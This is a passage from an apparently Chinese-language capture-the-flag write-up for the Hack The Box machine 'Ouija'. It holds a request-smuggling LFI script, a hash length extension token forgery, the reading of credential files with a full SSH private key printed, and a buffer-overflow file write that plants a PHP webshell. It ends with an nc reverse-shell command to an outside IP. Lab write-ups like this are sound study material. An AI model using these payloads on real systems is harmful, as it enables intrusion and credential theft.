class="keyword">else</span>&#123;<span class="keyword">return</span> <span class="number">1</span>;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ensure_auth</span>(<span class="params">q, r</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!q.headers[<span class="string">'ihash'</span>]) &#123;</span><br><span class="line">        r.json(<span class="string">"ihash header is missing"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (!q.headers[<span class="string">'identification'</span>]) &#123;</span><br><span class="line">        r.json(<span class="string">"identification header is missing"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(verify_cookies(q.headers[<span class="string">'identification'</span>], q.headers[<span class="string">'ihash'</span>]) != <span class="number">0</span>) &#123;</span><br><span class="line">        r.json(<span class="string">"Invalid Token"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (!(d(q.headers[<span class="string">'identification'</span>]).includes(<span class="string">"::admin:True"</span>))) &#123;</span><br><span class="line">        r.json(<span class="string">"Insufficient Privileges"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">"/login"</span>, (q,r,n) =&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span>(!q.query.uname || !q.query.upass)&#123;</span><br><span class="line">        r.json(&#123;<span class="string">"message"</span>:<span class="string">"uname and upass are required"</span>&#125;);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!q.query.uname || !q.query.upass)&#123;</span><br><span class="line">            r.json(&#123;<span class="string">"message"</span>:<span class="string">"uname &amp;&amp; upass are required"</span>&#125;);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            r.json(&#123;<span class="string">"message"</span>:<span class="string">"disabled (under dev)"</span>&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line">app.get(<span class="string">"/register"</span>, (q,r,n) =&gt; &#123;r.json(&#123;<span class="string">"message"</span>:<span class="string">"__disabled__"</span>&#125;);&#125;);</span><br><span class="line">app.get(<span class="string">"/users"</span>, (q,r,n) =&gt; &#123;</span><br><span class="line">    ensure_auth(q, r);</span><br><span class="line">    r.json(&#123;<span class="string">"message"</span>:<span class="string">"Database unavailable"</span>&#125;);</span><br><span class="line">&#125;);</span><br><span class="line">app.get(<span class="string">"/file/get"</span>,(q,r,n) =&gt; &#123;</span><br><span class="line">    ensure_auth(q, r);</span><br><span class="line">    <span class="keyword">if</span>(!q.query.file)&#123;</span><br><span class="line">        r.json(&#123;<span class="string">"message"</span>:<span class="string">"?file= i required"</span>&#125;);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">let</span> file = q.query.file;</span><br><span class="line">        <span class="keyword">if</span>(file.startsWith(<span class="string">"/"</span>) || file.includes(<span class="string">'..'</span>) || file.includes(<span class="string">"../"</span>))&#123;</span><br><span class="line">            r.json(&#123;<span class="string">"message"</span>:<span class="string">"Action not allowed"</span>&#125;);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            fs.readFile(file, <span class="string">'utf8'</span>, (e,d)=&gt;&#123;</span><br><span class="line">                <span class="keyword">if</span>(e) &#123;</span><br><span class="line">                    r.json(&#123;<span class="string">"message"</span>:e&#125;);</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    r.json(&#123;<span class="string">"message"</span>:d&#125;);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line">app.get(<span class="string">"/file/upload"</span>, (q,r,n) =&gt;&#123;r.json(&#123;<span class="string">"message"</span>:<span class="string">"Disabled for security reasons"</span>&#125;);&#125;);</span><br><span class="line">app.get(<span class="string">"/*"</span>, (q,r,n) =&gt; &#123;r.json(<span class="string">"200 not found , redirect to ."</span>);&#125;);</span><br></pre></td></tr></table></figure>

<h1 id="LFI"><a href="#LFI" class="headerlink" title="LFI"></a>LFI</h1><p>然后根据上面的file参数，很容易想到LFI：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023120415.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<p>后面就是LFI读文件，手工每次更新Content-Length太麻烦了，队友给了脚本(用pwntools来处理发送请求走私所需的请求太妙了)</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023120416.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<p>但并不能直接读到api那里所需的key,因为当前是在dev容器中</p>
<h2 id="lfi-py"><a href="#lfi-py" class="headerlink" title="lfi.py"></a>lfi.py</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> gzip </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) &lt; <span class="number">2</span>:</span><br><span class="line">	print(<span class="string">"missing file param"</span>)</span><br><span class="line">	sys.exit()</span><br><span class="line">	</span><br><span class="line">file = sys.argv[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">cl = len(<span class="string">"GET http://dev.ouija.htb/editor.php?file=%s HTTP/1.1\r\nh:"</span> % file)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"""POST / HTTP/1.1\r\nHost: ouija.htb\r\nContent-Length0aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa:\r\nContent-Length: %s\r\n\r\nGET http://dev.ouija.htb/editor.php?file=%s HTTP/1.1\r\nh:GET / HTTP/1.1\r\nHost: ouija.htb\r\n\r\n"""</span> % (cl, file)</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">'ouija.htb'</span>, <span class="number">80</span>)</span><br><span class="line">r.send(bytes(payload, <span class="string">'utf-8'</span>))</span><br><span class="line"></span><br><span class="line">response = r.recvrepeat(<span class="number">1</span>).decode(<span class="string">'utf-8'</span>)</span><br><span class="line"></span><br><span class="line">output = re.search(<span class="string">r'(?&lt;=\&lt;textarea name="content" id="content" cols="30" rows="10"\&gt;)([\s\S]*?)(?=\&lt;/textarea\&gt;)'</span>, response).group()</span><br><span class="line">print(output)</span><br></pre></td></tr></table></figure>

<h1 id="哈希长度扩展"><a href="#哈希长度扩展" class="headerlink" title="哈希长度扩展"></a>哈希长度扩展</h1><p>所以现有情况，我们知道所需的部分明文，以及目标hash，这种场景，哈希长度扩展攻击：</p>
<ul>
<li>Hash Length Extension Attack - HackTricks<br><a href="https://book.hacktricks.xyz/crypto-and-stego/hash-length-extension-attack" target="_blank" rel="noopener">https://book.hacktricks.xyz/crypto-and-stego/hash-length-extension-attack</a></li>
<li>iagox86/hash_extender<br><a href="https://github.com/iagox86/hash_extender" target="_blank" rel="noopener">https://github.com/iagox86/hash_extender</a></li>
</ul>
<p>编译报错的话参考这个修改Makefile：</p>
<ul>
<li>Update Makefile - FIX #24 #22 by Michele0303 · Pull Request #25 · iagox86/hash_extender<br><a href="https://github.com/iagox86/hash_extender/pull/25/commits/62b681af5a86175147de69b473a2a066063461e4" target="_blank" rel="noopener">https://github.com/iagox86/hash_extender/pull/25/commits/62b681af5a86175147de69b473a2a066063461e4</a></li>
</ul>
<p>密钥长度未知，所以指定一个范围：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./hash_extender -d 'bot1:bot' -s 4b22a0418847a51650623a458acc1bba5c01f6521ea6135872b9f15b56b988c1 -a '::admin:True' -f sha256 --secret-min=8 --secret-max 64</span><br></pre></td></tr></table></figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023120417.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<p>得到的New string 进行base64编码后作为identification，以及New signature作为ihash尝试请求api，最终得到一组有效的：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Type: sha256</span><br><span class="line">Secret length: 23</span><br><span class="line">New signature: 14be2f4a24f876a07a5570cc2567e18671b15e0e005ed92f10089533c1830c0b</span><br><span class="line">New string: 626f74313a626f748000000000000000000000000000000000000000000000000000000000000000f83a3a61646d696e3a54727565</span><br></pre></td></tr></table></figure>

<p>得到的响应是正常的，前面app.js里也可以看到写死了这个响应：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023120418.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h1 id="LFI-2"><a href="#LFI-2" class="headerlink" title="LFI  2"></a>LFI  2</h1><p>然后根据前面app.js中代码，/file/get可以用来读取文件，但存在过滤，不能<code>..</code>开头</p>
<p>但init.sh里有一行<code>ln -s /proc .config/bin/process_informations</code>,所以我们可以利用这个软链接通过proc过去来读取其他文件</p>
<p>这时候读取environ可以获取到key了（前面读取不到是因为属于不同的容器），但现在也不需要了：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023120419.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<p>后面就一点点读文件，passwd获取用户名，然后去读私钥：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.config&#x2F;bin&#x2F;process_informations&#x2F;self&#x2F;root&#x2F;etc&#x2F;passwd</span><br><span class="line">.config&#x2F;bin&#x2F;process_informations&#x2F;self&#x2F;root&#x2F;home&#x2F;leila&#x2F;.ssh&#x2F;id_rsa</span><br></pre></td></tr></table></figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023120420.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h2 id="leila-id-rsa"><a href="#leila-id-rsa" class="headerlink" title="leila_id_rsa"></a>leila_id_rsa</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN OPENSSH PRIVATE KEY-----</span><br><span class="line">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn</span><br><span class="line">NhAAAAAwEAAQAAAYEAqdhNH4Q8tqf8bXamRpLkKKsPSgaVR1CzNR&#x2F;P2WtdVz0Fsm5bAusP</span><br><span class="line">O4ef498wXZ4l17LQ0ZCwzVj7nPEp9Ls3AdTFZP7aZXUgwpWF7UV7MXP3oNJ0fj26ISyhdJ</span><br><span class="line">ZCTE&#x2F;7Wie7lkk6iEtIa8O5eW2zrYDBZPHG0CWFk02NVWoGjoqpL0&#x2F;kZ1tVtXhdVyd3Q0Tp</span><br><span class="line">miaGjCSJV6u1jMo&#x2F;uucsixAb+vYUrwlWaYsvgW6kmr26YXGZTShXRbqHBHtcDRv6EuarG5</span><br><span class="line">7SqKTvVD0hzSgMb7Ea4JABopTyLtQSioWsEzwz9CCkJZOvkU01tY&#x2F;Vd1UJvDKB8TOU2PAi</span><br><span class="line">aDKaZNpDNhgHcUSFH4&#x2F;1AIi5UaOrX8NyNYBirwmDhGovN&#x2F;J1fhvinXts9FlzHKZINcJ99b</span><br><span class="line">KkPln3e5EwJnWKrnTDzL9ykPt2IyVrYz9QmZuEXu7zdgGPxOd+HoE3l+Px9&#x2F;pp32kanWwT</span><br><span class="line">yuv06aVlpYqm9PrHsfGdyfsZ5OMG3htVo4&#x2F;OXFrBAAAFgE&#x2F;tOjBP7TowAAAAB3NzaC1yc2</span><br><span class="line">EAAAGBAKnYTR+EPLan&#x2F;G12pkaS5CirD0oGlUdQszUfz9lrXVc9BbJuWwLrDzuHn+PfMF2e</span><br><span class="line">Jdey0NGQsM1Y+5zxKfS7NwHUxWT+2mV1IMKVhe1FezFz96DSdH49uiEsoXSWQkxP+1onu5</span><br><span class="line">ZJOohLSGvDuXlts62AwWTxxtAlhZNNjVVqBo6KqS9P5GdbVbV4XVcnd0NE6ZomhowkiVer</span><br><span class="line">tYzKP7rnLIsQG&#x2F;r2FK8JVmmLL4FupJq9umFxmU0oV0W6hwR7XA0b+hLmqxue0qik71Q9Ic</span><br><span class="line">0oDG+xGuCQAaKU8i7UEoqFrBM8M&#x2F;QgpCWTr5FNNbWP1XdVCbwygfEzlNjwImgymmTaQzYY</span><br><span class="line">B3FEhR+P9QCIuVGjq1&#x2F;DcjWAYq8Jg4RqLzfydX4b4p17bPRZcxymSDXCffWypD5Z93uRMC</span><br><span class="line">Z1iq50w8y&#x2F;cpD7diMla2M&#x2F;UJmbhF7u83YBj8Tnfh6BN5fj8ff6ad9pGp1sE8rr9OmlZaWK</span><br><span class="line">pvT6x7Hxncn7GeTjBt4bVaOPzlxawQAAAAMBAAEAAAGAEJ9YvPLmNkIulE&#x2F;+af3KUqibMH</span><br><span class="line">WAeqBNSa+5WeAGHJmeSx49zgVPUlYtsdGQHDl0Hq4jfb8Zbp980JlRr9&#x2F;6vDUktIO0wCU8</span><br><span class="line">dY7IsrYQHoDpBVZTjF9iLgj+LDjgeDODuAkXdNfp4Jjtl45qQpYX9a0aQFThTlG9xvLaGD</span><br><span class="line">fuOFkdwcGh6vOnacFD8VmtdGn0KuAGXwTcZDYr6IGKxzIEy&#x2F;9hnagj0hWp3V5&#x2F;4b0AYxya</span><br><span class="line">dxr1E&#x2F;YUxIBC4o9oLOhF4lpm0FvBVJQxLOG+lyEv6HYesX4txDBY7ep6H1Rz6R+fgVJPFx</span><br><span class="line">1LaYaNWAr7X4jlZfBhO5WIeuHW+yqba6j4z3qQGHaxj8c1+wOAANVMQcdHCTUvkKafh3oz</span><br><span class="line">4Cn58ZeMWq6vwk0vPdRknBn3lKwOYGrq2lp3DI2jslCh4aaehZ1Bf+&#x2F;UuP6Fc4kbiCuNAR</span><br><span class="line">dM7lG35geafrfJPo9xfngr44I8XmhBCLgoFO4NfpBSjnKtNa2bY3Q3cQwKlzLpPvyBAAAA</span><br><span class="line">wErOledf+GklKdq8wBut0gNszHgny8rOb7mCIDkMHb3bboEQ6Wpi5M2rOTWnEO27oLyFi1</span><br><span class="line">hCAc+URcrZfU776hmswlYNDuchBWzNT2ruVuZvKHGP3K3&#x2F;ezrPbnBaXhsqkadm2el5XauC</span><br><span class="line">MeaZmw&#x2F;LK+0Prx&#x2F;AkIys99Fh9nxxHcsuLxElgXjV+qKdukbT5&#x2F;YZV&#x2F;axD4KdUq0f8jWALy</span><br><span class="line">rym4F8nkKwVobEKdHoEmK&#x2F;Z97Xf626zN7pOYx0gyA7jDh1WwAAAMEAw9wL4j0qE4OR5Vbl</span><br><span class="line">jlvlotvaeNFFUxhy86xctEWqi3kYVuZc7nSEz1DqrIRIvh1Anxsm&#x2F;4qr4+P9AZZhntFKCe</span><br><span class="line">DWc8INjuYNQV0zIj&#x2F;t1mblQUpEKWCRvS0vlaRlZvX7ZjCWF&#x2F;84RBr&#x2F;0Lt3t4wQp44q1eR0</span><br><span class="line">nRMaqbOcnSmGhvwWaMEL73CDIvzbPK7pf2OxsrCRle4BvnEsHAG&#x2F;qlkOtVSSerio7Jm7c0</span><br><span class="line">L45zK+AcLkg48rg6Mk52AzzDetpNd5AAAAwQDd&#x2F;1HsP1iVjGut2El2IBYhcmG1OH+1VsZY</span><br><span class="line">UKjA1Xgq8Z74E4vjXptwPumf5u7jWt8cs3JqAYN7ilsA2WymP7b6v7Wy69XmXYWh5RPco3</span><br><span class="line">ozaH3tatpblZ6YoYZI6Aqt9V8awM24ogLZCaD7J+zVMd6vkfSCVt1DHFdGRywLPr7tqx0b</span><br><span class="line">KsrdSY5mJ0d004Jk7FW+nIhxSTD3nHF4UmLtO7Ja9KBW9e7z+k+NHazAhIpqchwqIX3Io6</span><br><span class="line">DvfM2TbsfLo4kAAAALbGVpbGFAb3VpamE&#x3D;</span><br><span class="line">-----END OPENSSH PRIVATE KEY-----</span><br></pre></td></tr></table></figure>

<h1 id="user-flag"><a href="#user-flag" class="headerlink" title="user flag"></a>user flag</h1><p>使用得到的私钥登录：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023120421.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h1 id="提权信息"><a href="#提权信息" class="headerlink" title="提权信息"></a>提权信息</h1><p>基础枚举发现本地9999端口，查看代码发现say_lverifier没有在php文件中定义，进一步发现自定义的php扩展，下载下来分析，可以发现相关函数在so中</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;development&#x2F;server-management_system_id_0</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;php&#x2F;20220829&#x2F;lverifier.so</span><br></pre></td></tr></table></figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023120427.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023120426.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<p>然后在验证用户输入后调用event_recorder写入日志文件：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023120428.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h2 id="整数溢出"><a href="#整数溢出" class="headerlink" title="整数溢出"></a>整数溢出</h2><p>这部分是作者给了提示， 首先找到一个整数溢出，这会给你带来缓冲区溢出，然后调试扩展以跟踪执行/并检查堆栈</p>
<p>可以看到username的目标nu缓冲区分配了800，但输入并没有限制，使用size_t类型来保存username的size，这个最大值65535，所以整数溢出应该是这部分</p>
<p>(静态分析就看个大概就行，知道整数溢出后面结合调试就都是基础内容)</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023120429.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h2 id="debug"><a href="#debug" class="headerlink" title="debug"></a>debug</h2><p>本地安装so，调试</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sudo cp lverifier.so /usr/lib/php/20220829</span><br><span class="line">sudo chmod +x /usr/lib/php/20220829/lverifier.so</span><br><span class="line">sudo nano /etc/php/8.2/mods-available/lverifier.ini</span><br><span class="line"><span class="meta">#</span><span class="bash"> 添加这行到lverifier.ini</span></span><br><span class="line">extention=lverifier.so</span><br><span class="line"><span class="meta">#</span><span class="bash"> 修改php.ini,启用dl</span></span><br><span class="line">enable_dl = On</span><br><span class="line"><span class="meta">#</span><span class="bash"> 安装gef</span></span><br><span class="line">bash -c "$(curl -fsSL https://gef.blah.cat/sh)"</span><br></pre></td></tr></table></figure>

<p>环境配置完成后，进入调试部分,根据调试和静态分析结果知道是会读取shadow文件，验证用户名密码,并且会产生/var/log/lverifier.log文件,写入日志信息：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sudo gdb php</span><br><span class="line">(gdb) run -a</span><br><span class="line">php &gt; dl('lverifier.so');</span><br><span class="line">php &gt; var_dump(say_lverifier('aaaa', 'bbbb'));</span><br><span class="line">php &gt; $u = str_repeat('A', 4096000);</span><br><span class="line">php &gt; $x = say_lverifier($u, 'world');</span><br><span class="line"><span class="meta">#</span><span class="bash"> crash</span></span><br><span class="line">gef➤  b event_recorder</span><br></pre></td></tr></table></figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023120424.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<p>之后常规的生成数据计算偏移，再次运行，发现我们可以覆盖event_recorder的两个参数：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pwn cyclic 65538</span><br></pre></td></tr></table></figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023120430.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<p>计算可以知道，控制的event_recorder参数：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 第一个参数，即写入日志路径</span></span><br><span class="line">username[16:800]</span><br><span class="line"><span class="meta">#</span><span class="bash"> 第二个参数，即写入日志文件的内容</span></span><br><span class="line">username[128:800]</span><br></pre></td></tr></table></figure>

<h2 id="文件写入"><a href="#文件写入" class="headerlink" title="文件写入"></a>文件写入</h2><p>然后根据结果修改输入的username，验证可以在任意路径写入任意文件：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">'/'*795+'/test' + padding</span><br><span class="line">php &gt; $u = '////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////test'.str_repeat('A', 64738);</span><br><span class="line">php &gt; $x = say_lverifier($u, 'world');</span><br></pre></td></tr></table></figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023120431.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023120432.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h2 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h2><p>现在就是能控制日志文件路径，并且日志内容也是路径的后面大部分，那如何进一步利用，例如获取webshell呢</p>
<p>也很简单，如果我们创建一个目录名是php代码的目录，然后修改对应的输入并且跳转最终写入php文件到web目录，这样最终写入的日志中也包含我们的目录名即php代码：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">leila@ouija:~$ mkdir "/tmp/miao/&lt;?=\`\$_GET[0]\`?&gt;"</span><br><span class="line">leila@ouija:~$ ls /tmp/miao</span><br><span class="line"></span><br><span class="line">a = '/tmp/miao/&lt;?=`$_GET[0]`?&gt;/../../..//development/server-management_system_id_0/index.php'</span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt; len(a)</span></span><br><span class="line">86</span><br><span class="line"></span><br><span class="line">'/'*714 + a  + 'A'*64738</span><br></pre></td></tr></table></figure>

<p>最终payload作为用户名发送，验证webshell生成成功：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023120433.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023120434.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023120435.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>



<h2 id="test-php"><a href="#test-php" class="headerlink" title="test.php"></a>test.php</h2><p>调试用的php文件：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$extPath = ini_get(<span class="string">"extension_dir"</span>);</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Extension Dir: "</span> . $extPath . <span class="string">"\n"</span>;</span><br><span class="line">dl(<span class="string">'lverifier.so'</span>);</span><br><span class="line">$u = str_repeat(<span class="string">'A'</span>, <span class="number">4096000</span>);</span><br><span class="line">$x = say_lverifier($u, <span class="string">'world'</span>);</span><br><span class="line">$y = $x ? <span class="string">'true'</span> : <span class="string">'false'</span>;</span><br><span class="line"><span class="keyword">print</span>(<span class="string">'var x: '</span> . $y . <span class="string">"\n"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h1 id="root-flag"><a href="#root-flag" class="headerlink" title="root flag"></a>root flag</h1><p>写入webshell成功后就随意执行命令了：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:9999&#x2F;miao.php?0&#x3D;rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fbash%20-i%202%3E%261%7Cnc%2010.10.16.6%204444%20%3E%2Ftmp%2Ff</span><br></pre></td></tr></table></figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023120423.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

